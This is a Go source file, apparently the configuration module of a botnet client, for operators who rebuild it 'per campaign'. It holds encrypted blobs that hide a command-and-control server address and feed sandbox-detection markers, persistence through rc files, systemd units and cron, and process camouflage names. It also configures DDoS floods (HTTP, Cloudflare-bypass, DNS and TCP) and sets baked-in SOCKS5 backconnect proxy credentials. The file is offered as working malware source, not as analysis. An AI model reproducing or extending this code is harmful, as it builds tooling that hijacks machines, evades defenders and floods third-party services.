package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "ed34fe42" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "@E2Aryki*&QHaAqr" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "v5.9" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "sRqn2362NNHJ"    //change me run setup.py
var proxyPass = "hGNuLxxASMxC"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	binLabel    string
	unitPath    string
	unitName    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("684f5faf70a4337fbbf4d386eb0aaee7c2fb9ee23998e3eb293052179d28e8774e08b1f24ea3ccc554805eb46b4281a6494e8adeaf88a937189315ab4e4e5002d5bd78c701022b6e") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("f07d3117a566bd433560d7860a0c29a5cb16f577efae75c4cf242d344a741bf26007130bf9bc6f09de5297fcc5a2987b8ec78f0000bbb4f9551891e81e8711ee7314cdd2343fca1131d227b6719f577b8626c685024542d0e1acc5824b581e83a35454a5e77d1f7bdd9a017d6c89d5dd923d2e33a7")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("9e7581a876197d12d49d574eabfeda2ce125044917d871b3f06f7b461554d082cd226def97eecb07ff8dca637e0be25c7ea7f2d07144aa17b75ecff85fd98076054cfa7fcb02fa05f4f2")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("e44d87a0282d49c6f37703589ec6d4ca854db221a15a3427b274007228ccb12c")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("3688dd8077ce98b94a55c75782383db614ec967c9ef4a0b8dead917f60")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("ead6677de88bd18076dca9db9ce699d010661d18ad2a2314200b51e364f7caa9f9289a191b")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("1b364e03cf1542667bf85b8bd0ee0951d368ccd52a47c353dec6cd721e")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("3abcc67dc137fedf142c4a31093f49898504a442b279179e220a4a3f434d4d0eab0c64c38fc31062bb581ac7124e2b7b64769f0a7d82fa")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("57e650ccaf44e34fd7c2a46c6b46176c6967ea25718e9377c4977684bbd430120d9d8e")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("70d0ffe44ec981e503246124091b8c157e0a8931eedc59a87a")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("62a5da6d46522db6ab0e28e3f9953ed871d2eaeacd9b2c66f819c907be")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("0175c1b3b7d2047a4bf5add8877f5b8c7898481b4532aed4c8175af6dccc1b9fad61a7ae9f4822")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("de181431ca898bb64c28759ff98ab615a56843884d9f6044cae7fdf158c0dbb774833647e0b2011e25d8f2")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("122f8f297113c423c7deba292913ed2e2969e60f49330b830928470e3be038")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("e85170d2dc82c7124d775505a0ea7c2dc981ebd82b44a3151f808640")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("233aa521423baad144ddb38d069f33262cd61181db8a7dacf4b5a286ab363f8f35046bceb7422cf8ee70e133808dd3ea")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("d8f30eea275e315bb73a00ba466f2b6eed29dd5c")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("b555ec4b1845bad09052f46d8c18d6f306b6e37ac5")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("5c99bdd341be8b39711340b6b0b4aaf5f5a073cb2d6b25265251972a6aebbb")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("4a7136292ff3e0bcb9ca60560d0f20f6d302d742d1353a82fc77")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("3cb42141caaa8b41718096da2d53d1d8fcbf03813b207cd5c0a540")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("7065c63fc1872b70c5fde412d2cdb5a6ba52ecc3822beb7d167be5")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("a9f2371dec7d3b956d0d6107ef0148edc273ec3c6305f406bc4f357ce33b52")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("7f3a9e9806cff32101d58afdaa8b3e3f69e5a86da33a8ccc390c04028c7a8e4648016a99628b13dc510e18080e3535da3c7c5a1535")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("98f19d459395fa7efbff7126935addfab224d8c44a1039eafd")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("0813375369fd8f5ce1f0a8a44515a20fddc160046552680ba49148bdd13cb3c5b8e2")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("6cbca92167b2da4f6aeb07793c04c674e3fac74397a05f39258aa33e8d38b98959f81bccedb2ad947cbb03ca00db")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("d8aacae61d5abdb3459c8e3caf4ec8b76dfe02012af8f0178e826bafe41370775deb6f5fb6db2b5fd90a72f3")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("416a7fbbc93e8cdde82d002de0369c8fac48d55f0c766617b9ca1ccfe5ff9340e35466a0bf78e0079e56d568b186c24be7f0391000238f78e05b")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("8b0e79a99775fd1d65cbabb0851c3651138d6d9ab653658f30ff70958951474c")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("45276c0dcaf35f03789c846e6f947a22b249b16857fcf02d7a564f758dc81bcdf4371d4b059238278ed41b1c7c681c5c")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("1bc1e0643d8d94de59c4614d39010b4100e6d3562375546ae345523ac28c35e9619e24edd5")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("f521511f63d84b111b0aa5cce6e24b9976a993b3796a8f34da4d65edcd03cd357d541bef1e196c40235f31f714c502")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("b34412bf175861fa0a12480f6fd1b2000eb3206eb35c1408b35fd0027cd18f5b7d84f78a2f41da8b4dd3883869786c86e013b57ea7b81182ab35a9ab88a0ad3bf864f5d3f990c373182a475a84d8812ceb4bafc39b7ed41ffa632b3ab4e3452a6d4baeef29da26ef7ebd2fa6d93e7e8cec")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("58b42352588a88604b2dad5861d93fd728c55fd457adc313ee518fdc5940f30c8bf8fd4261881233e08dd6793736716d63422ad01960bf33f954d32f660cbc35896b94f722411ce8625490a0c176503506")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("b6a1f99f7991e38343be951476821b2c0d4104ceb7db41f7095ab255b551d814532443d83bfa919cf1f4839ed0029f2348a6824d439d633efc976f784fc3d28eaf81557b989cfc436f5a89c3ec1f")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("5c41d72f72bab6e017fb1925979c10a75b6a162785ca4e8ad4d53059a3bd852cb3665b08550eaadefa452365453a7ebd76f37a1566d791e8c70e42f665775ee7f80665a064000159480986febe")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("dd19e552fecdb691c4c646a4fcc0d22323edc572242cd8cfa3f70ba17aae6760264b8177d6cc31d68706d42f4f08ba5c160bdf32557a1a8c73992b15a301ba")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("a76605c62a06feeb85856730181e16fb797603fe04ac61691420b328ccd2bc585412fb16")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("066c87f94abbb691c2d8ba8531dc6ef346bced2f2bb2ccdd2c16eb423f9c23f4ba9222e6fd2e9d20a6e17da353d6535bc7f0bf3e0143eb9b5ec8ec3e55b213bd9c6874186a5af674b866d3d945122fcc217a790ad2c27986ba3acee0625d1fda71ff1fe3158b94ea06bf81eca88fe81be10a0463c74051999939431c09205c18ad788fa437fc88b41af1fba52fbe53911d26cf7403655827616d466581471b74fcaed6abda850b77f5f296e9fa60e3db743fba590e6e97760c1e946272c0d059627e87d069630deb3d8cbafe65724a6b8a8f6ec45a2b4f239876351ae4")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("37d267672479731290fa4587769b2fe460fd751815844329b49c539263b10f589861b1fae5a4c606a39b140078de621dd9a9ad07884909ee0e81d65ee93188a7534e81d037151099f55e0ced85d18fba8f3fa099f8d3f3b8c9335c")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("04e490c8ec85a4b3aa723d612b079f0bc47c1695fb3e55e4d90ad8cc87c143121035b991e27017a55b384534307e2dedb5ce094e68a798aa8b47e5")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("5f61f6b2e15ef9468056223d8124af65c86c94bda1bb911235f73ba21492b0e7732bb4ff65d4a05ad171187bc3a2ee57d8a24c4b83f4cfb88a4c407b9c25fb2b4b983f97c9b994d65d")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("45357d1a82fda6a18ab351bdcaf1ff36d2d9bf5854756b")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("89a57d49c07415e66357868a946d33d8891f27e1fb413849f8f8a44bdc5402e6931c")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("3b14317568405695e6ed7e9225332c1eab159b58dc8d27d4c42738e85fcdbfdae7358db0b58051942ca21f11d7e2980fb3dc8a17907edf28750c0083ffee5d11d44819427ac30592beb20fdbdbf2a41c92111fa2dc223f0595f5f1a1b46079")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("323d18852c4d357cf96e2ee3b93b535d44f8")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("6e0626067f717e16dba36a00ded86f2f7efd224a8398b9e182bdaca80c408ca719853d2f405d837f11263d94088927eeb6f6a62f51")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("4dc21ee06b0312ebac75a9585b2bbfcb6759")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("5d4a9f647baf479814a4e48a294d6c701eba")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("db159dffdccdf26be454c2dd01c148b0405ad518733b")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("f2ea3bc8069df97608d4ba2a664cd96b446fe70272e8b516")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("1e4e77863086f6392f15fc0cbd75f0314e0af833a5")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("2ef48f2e5b6dbcfa0c52bffe3388067dac78")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("81144ae261f4083c4caa055b898d53fb054581a8ea5044bdbd")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("365b770f3a10708eb4586c7037df51c48d597f503cf641ebd3")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("c0a3f6a075fc9a221a825c2fd41c2efcdd534ff72b3286")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("8f92a64319beea1c87b1597dbfda5a253c717894")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
